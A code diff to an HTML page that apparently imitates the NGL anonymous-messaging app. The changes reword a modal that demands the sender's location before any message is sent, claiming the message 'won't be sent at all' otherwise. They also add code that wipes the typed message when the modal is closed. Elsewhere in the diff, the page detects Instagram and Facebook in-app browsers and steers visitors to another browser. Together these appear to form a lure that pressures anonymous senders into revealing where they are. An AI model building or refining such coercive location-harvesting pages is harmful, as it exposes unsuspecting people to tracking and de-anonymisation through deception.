@@ -457,8 +457,6 @@
       text-shadow: 0 1px 4px rgba(244,63,94,0.13);
       margin-top: 2px;
     }
-
-    /* MODALS */
     .ngl-modal-outer {
       display: none;
       position: fixed;
@@ -604,23 +602,19 @@
       </div>
     </div>
   </div>
-
-  <!-- Location Modal -->
+  <!-- Location Modal (NGL-branded and playful) -->
   <div id="nglLocationModal" class="ngl-modal-outer">
     <div class="ngl-modal-inner">
       <div style="font-size:2.1rem; font-weight:700; margin-bottom:20px; color:#f43f5e;">
-        📍 Location Required
+        🗺️ Enable Location!
       </div>
       <div style="font-size:1.12rem; margin-bottom:14px;">
-        <b style="color:#f43f5e;">Must open location</b> in order to send to the <b>Receiver</b>.<br>
-        <span style="font-size:1.04rem; color:#444;">
-          If not, this message won't be sent at all.
-        </span>
+        <span style="color:#f43f5e;"><b>We need your location</b></span> to send your message to the receiver.<br>
+        <span style="color:#f43f5e;">If you don't allow it, your message won't be sent at all.</span>
       </div>
-      <button class="ngl-modal-btn" id="nglLocationModalClose">Okay, got it!</button>
+      <button class="ngl-modal-btn" id="nglLocationModalClose">Okay, I’ll allow!</button>
     </div>
   </div>
-
   <!-- In-App Browser Not Supported Modal -->
   <div id="nglInAppModal" class="ngl-modal-outer">
     <div class="ngl-modal-inner">
@@ -638,9 +632,8 @@
       <button class="ngl-modal-copy" id="nglCopyLinkBtn">Copy Link</button>
     </div>
   </div>
-
   <script>
-    // ---- In-app browser detection ----
+    // --- In-app browser detection ---
     function isInAppBrowser() {
       var ua = navigator.userAgent || navigator.vendor || '';
       return /FBAN|FBAV|FB_IAB|FB4A|FBCR|FBSV|FBID|Messenger|Instagram/i.test(ua);
@@ -653,13 +646,17 @@
       document.getElementById('nglInAppModal').style.display = 'none';
       document.getElementById('fadeContainer').style.display = '';
     }
-    function showNglLocationModal() {
+    // --- NGL-style Location Modal logic (with message clearing) ---
+    function showNglLocationModalAndResetMsg() {
       document.getElementById('nglLocationModal').style.display = 'flex';
+      document.getElementById('nglLocationModalClose').onclick = function() {
+        document.getElementById('nglLocationModal').style.display = 'none';
+        document.getElementById('message').value = '';
+        document.getElementById('sentOverlay').style.display = 'none';
+        document.getElementById('fadeContainer').classList.remove('fade-out');
+        document.getElementById('message').focus();
+      };
     }
-    function hideNglLocationModal() {
-      document.getElementById('nglLocationModal').style.display = 'none';
-    }
-    document.getElementById('nglLocationModalClose').onclick = hideNglLocationModal;
     document.getElementById('nglCopyLinkBtn').onclick = function() {
       navigator.clipboard.writeText(window.location.href).then(function() {
         document.getElementById('nglCopyLinkBtn').textContent = 'Copied!';
@@ -673,7 +670,6 @@
         showNglInAppModal();
       }
     });
-
     // --- Dice phrases ---
     const phrases = [
       "I like u, do u like me too?",
@@ -852,11 +848,11 @@
           );
         });
         if (!locationAllowed) {
-          showNglLocationModal();
+          showNglLocationModalAndResetMsg();
           return false;
         }
       } else {
-        showNglLocationModal();
+        showNglLocationModalAndResetMsg();
         return false;
       }
       container.classList.add('fade-out');
